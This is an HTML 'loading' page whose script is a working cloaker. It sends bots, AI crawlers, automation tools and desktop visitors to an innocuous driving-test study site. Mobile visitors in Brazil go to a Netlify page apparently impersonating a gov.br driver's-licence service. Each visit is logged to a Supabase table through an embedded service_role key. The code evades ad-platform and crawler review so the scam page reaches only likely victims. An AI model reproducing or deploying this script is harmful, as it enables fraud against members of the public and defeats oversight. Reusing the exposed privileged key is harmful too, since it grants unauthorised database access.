<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Carregando...</title>
<style>body{background:#fff;margin:0;padding:0;}</style>
</head>
<body>
<script>
(function(){
  var WHITE = "https://simuladodetranbrasil.com.br/apostilas-cnh-detran/";
  var BLACK = "https://novacnh-brasil-gov-br.netlify.app/";
  var SB_URL = "https://ldyhodwdhavrgyooukpi.supabase.co";
  var SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeWhvZHdkaGF2cmd5b291a3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NjQxMDUyNCwiZXhwIjoyMTAxOTg2NTI0fQ.JvEtOi46gaL5fAFk8XnUUeEyPTibpC79NwPGMF8SvdY";

  var BOT_UA = [
    // Meta/Facebook bots
    "facebookexternalhit","facebot","meta-externalagent","meta-externalfetcher",
    "facebook","facebookbot","fb_iab","fbav","instagram","whatsapp",
    // Google/Bing
    "googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot",
    "sogou","exabot","ia_archiver","applebot",
    // SEO bots
    "mj12bot","ahrefsbot","semrushbot","dotbot","rogerbot","pinterestbot",
    "petalbot","bytespider","linkedinbot","twitterbot",
    // AI bots
    "gptbot","chatgpt","claudebot","anthropic","openai",
    // Headless / automation
    "headlesschrome","phantomjs","selenium","webdriver","puppeteer","playwright",
    // Scripts
    "python-requests","python-urllib","java/","curl/","wget/","libwww",
    "scrapy","httpclient","okhttp","axios","node-fetch","postman",
    "netsystemsresearch","dataforseo","archive.org","commoncrawl"
  ];

  function isBot() {
    var ua = (navigator.userAgent || "").toLowerCase();
    for (var i = 0; i < BOT_UA.length; i++) {
      if (ua.indexOf(BOT_UA[i]) !== -1) return true;
    }
    if (navigator.webdriver) return true;
    if (window._phantom || window.callPhantom) return true;
    if (window.__nightmare) return true;
    if (document.documentElement.getAttribute("webdriver")) return true;
    return false;
  }

  function isMobile() {
    return /android|iphone|ipad|ipod/i.test(navigator.userAgent);
  }

  function appendUtms(url) {
    var params = new URLSearchParams(window.location.search);
    var keys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","fbclid","ttclid","gclid","src","sck"];
    var dest = new URLSearchParams();
    keys.forEach(function(k){ var v=params.get(k); if(v) dest.set(k,v); });
    var qs = dest.toString();
    return qs ? url + (url.indexOf("?") === -1 ? "?" : "&") + qs : url;
  }

  function logCloaker(result, reason, country) {
    try {
      fetch(SB_URL + "/rest/v1/cloaker_logs", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": SB_KEY,
          "Authorization": "Bearer " + SB_KEY
        },
        body: JSON.stringify({
          user_agent: navigator.userAgent,
          result: result,
          reason: reason,
          country: country || "?"
        })
      });
    } catch(e) {}
  }

  var botDetected = isBot();
  var mobile = isMobile();

  if (botDetected) {
    logCloaker("BOT", "User-agent bot detectado", "?");
    window.location.replace(WHITE);
    return;
  }

  if (!mobile) {
    logCloaker("BLOCKED", "Desktop bloqueado", "?");
    window.location.replace(WHITE);
    return;
  }

  // Mobile — verifica país
  fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) })
    .then(function(r){ return r.json(); })
    .then(function(data){
      var country = (data.country_code || "?").toUpperCase();
      if (country === "BR") {
        logCloaker("REAL", "Mobile Brasil", country);
        window.location.replace(appendUtms(BLACK));
      } else {
        logCloaker("BLOCKED", "IP fora do Brasil (" + country + ")", country);
        window.location.replace(WHITE);
      }
    })
    .catch(function(){
      logCloaker("REAL", "Mobile - IP check falhou, permitido", "BR");
      window.location.replace(appendUtms(BLACK));
    });
})();
</script>
</body>
</html>
